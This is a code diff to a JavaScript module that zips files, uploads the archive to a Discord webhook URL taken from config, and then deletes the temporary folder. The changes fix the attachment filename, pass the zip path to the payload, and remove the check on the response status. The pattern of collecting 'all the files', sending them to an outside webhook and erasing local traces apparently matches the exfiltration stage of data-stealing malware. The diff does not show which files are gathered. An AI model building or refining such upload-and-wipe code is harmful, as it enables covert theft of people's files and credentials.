@@ -1,7 +1,7 @@
 const { webhook } = require('../config');
 const { isValidURL } = require('../util/string');
 const axios = require('axios');
-const { join } = require('path');
+const { join, sep } = require('path');
 const os = require('os');
 const { filesize } = require('filesize');
 const fs = require('fs');
@@ -152,10 +152,10 @@ const json = async (zipFile) => {
     attachments: [
       {
         id: 0,
-        filename: zipFile,
+        filename: zipFile?.split(sep)?.pop(),
         description: 'A zip archive containing all the files.',
         content_type: 'application/zip',
-        url: `attachment://${zipFile}`,
+        url: `attachment://${zipFile?.split(sep)?.pop()}`,
       }
     ]
   };
@@ -164,13 +164,12 @@ const json = async (zipFile) => {
 module.exports = async (zipFile) => {
   const data = new FormData();
   data.append('files[0]', fs.createReadStream(zipFile));
-  data.append('payload_json', JSON.stringify(await json()));
+  data.append('payload_json', JSON.stringify(await json(zipFile)));
 
   axios.post(webhook.url, data, {
     headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
   })
-    .then(res => {
-      if (res.status !== 200) return;
+    .then(() => {
       // Zip sent to Discord webhook, now we can delete all the files
       rmSync(tempFolder, { recursive: true });
     })
